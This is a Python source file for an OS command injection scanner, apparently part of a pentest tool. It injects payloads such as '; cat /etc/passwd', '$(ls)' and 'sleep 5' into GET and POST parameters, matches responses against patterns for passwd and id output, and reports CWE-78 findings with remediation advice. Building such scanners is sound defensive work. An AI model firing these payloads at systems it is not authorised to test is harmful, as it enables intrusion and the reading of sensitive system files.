"""
Command Injection detection scanner
"""
import asyncio
import logging
import time
from typing import List, Optional
from app.models import Vulnerability, SeverityLevel, VulnerabilityCategory
from app.utils import PentestHTTPClient

logger = logging.getLogger(__name__)

class CommandInjectionScanner:
    """Detect OS command injection vulnerabilities"""

    # Command injection payloads
    PAYLOADS = [
        # Linux/Unix
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "|| ls",
        "`ls`",
        "$(ls)",
        "; whoami",
        "| whoami",
        "&& whoami",
        "; id",
        "| id",

        # Time-based detection
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "` sleep 5 `",
        "$( sleep 5 )",

        # Windows
        "& dir",
        "| dir",
        "&& dir",
        "& whoami",
        "| whoami",
        "&& whoami",

        # With command separators
        "\n whoami",
        "\r\n whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
    ]

    # Command output patterns
    COMMAND_PATTERNS = [
        # Linux commands
        r"total \d+",  # ls -l output
        r"uid=\d+",  # id command
        r"root:x:0:0",  # /etc/passwd
        r"bin.*bash",  # /etc/passwd
        r"nobody:x:",  # /etc/passwd

        # Windows commands
        r"Volume in drive",
        r"Directory of",
        r"<DIR>",

        # Whoami output
        r"[a-z0-9_-]+\\[a-z0-9_-]+",  # Windows: DOMAIN\user
    ]

    def __init__(self, client: PentestHTTPClient):
        self.client = client

    async def scan(self, endpoints: List[str]) -> List[Vulnerability]:
        """Scan for command injection vulnerabilities"""
        vulnerabilities = []

        tasks = []
        for endpoint in endpoints:
            tasks.append(self._test_endpoint(endpoint))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, list):
                vulnerabilities.extend(result)

        return vulnerabilities

    async def _test_endpoint(self, endpoint: str) -> List[Vulnerability]:
        """Test an endpoint for command injection"""
        vulnerabilities = []

        # Test GET parameters
        if '?' in endpoint:
            vulns = await self._test_get_params(endpoint)
            vulnerabilities.extend(vulns)

        # Test POST parameters
        vulns = await self._test_post_params(endpoint)
        vulnerabilities.extend(vulns)

        return vulnerabilities

    async def _test_get_params(self, endpoint: str) -> List[Vulnerability]:
        """Test GET parameters for command injection"""
        vulnerabilities = []

        if '?' not in endpoint:
            return vulnerabilities

        base_url, query_string = endpoint.split('?', 1)
        params = {}

        for param in query_string.split('&'):
            if '=' in param:
                key, value = param.split('=', 1)
                params[key] = value

        # Test each parameter
        for param_name, original_value in params.items():
            for payload in self.PAYLOADS[:15]:
                test_params = params.copy()
                test_params[param_name] = original_value + payload

                vuln = await self._test_payload(
                    'GET',
                    base_url,
                    param_name,
                    payload,
                    params=test_params
                )
                if vuln:
                    vulnerabilities.append(vuln)
                    break

        return vulnerabilities

    async def _test_post_params(self, endpoint: str) -> List[Vulnerability]:
        """Test POST parameters for command injection"""
        vulnerabilities = []

        test_params = {
            'cmd': 'test',
            'command': 'test',
            'exec': 'test',
            'execute': 'test',
            'ping': '127.0.0.1',
            'ip': '127.0.0.1',
            'host': 'localhost',
            'file': 'test.txt',
            'path': '/tmp/test',
        }

        for param_name, original_value in test_params.items():
            for payload in self.PAYLOADS[:15]:
                data = test_params.copy()
                data[param_name] = original_value + payload

                vuln = await self._test_payload(
                    'POST',
                    endpoint,
                    param_name,
                    payload,
                    data=data
                )
                if vuln:
                    vulnerabilities.append(vuln)
                    break

        return vulnerabilities

    async def _test_payload(
        self,
        method: str,
        url: str,
        param_name: str,
        payload: str,
        **kwargs
    ) -> Optional[Vulnerability]:
        """Test a specific payload"""
        try:
            # Measure response time for time-based detection
            start_time = time.time()

            if method == 'GET':
                response = await self.client.get(url, **kwargs)
            else:
                response = await self.client.post(url, **kwargs)

            elapsed_time = time.time() - start_time

            if not response:
                return None

            # Check for command output in response
            import re
            for pattern in self.COMMAND_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return Vulnerability(
                        id=f"cmdi_{method.lower()}_{param_name}_{hash(url)}",
                        title="OS Command Injection",
                        description=f"Command injection vulnerability in {method} parameter '{param_name}'",
                        severity=SeverityLevel.CRITICAL,
                        category=VulnerabilityCategory.INJECTION,
                        affected_url=url,
                        affected_parameter=param_name,
                        proof_of_concept=f"The parameter '{param_name}' allows execution of OS commands. "
                                       f"Command output detected in the response.",
                        payload=payload,
                        remediation="Never pass user input directly to system commands. "
                                  "Use parameterized APIs instead of shell commands. "
                                  "Implement strict input validation with whitelisting. "
                                  "Run application with minimum required privileges.",
                        cwe_id="CWE-78",
                        owasp_category="A03:2021 – Injection",
                        references=[
                            "https://owasp.org/www-community/attacks/Command_Injection",
                            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
                        ]
                    )

            # Time-based detection (if sleep command)
            if 'sleep' in payload.lower() and elapsed_time >= 5:
                return Vulnerability(
                    id=f"cmdi_blind_{method.lower()}_{param_name}_{hash(url)}",
                    title="Blind OS Command Injection (Time-based)",
                    description=f"Blind command injection in {method} parameter '{param_name}'",
                    severity=SeverityLevel.CRITICAL,
                    category=VulnerabilityCategory.INJECTION,
                    affected_url=url,
                    affected_parameter=param_name,
                    proof_of_concept=f"The parameter '{param_name}' is vulnerable to blind command injection. "
                                   f"Time delay observed: {elapsed_time:.2f}s",
                    payload=payload,
                    remediation="Never pass user input directly to system commands. "
                              "Use parameterized APIs instead of shell commands. "
                              "Implement strict input validation with whitelisting.",
                    cwe_id="CWE-78",
                    owasp_category="A03:2021 – Injection",
                    references=[
                        "https://owasp.org/www-community/attacks/Command_Injection"
                    ]
                )

        except Exception as e:
            logger.debug(f"Error testing command injection: {e}")

        return None
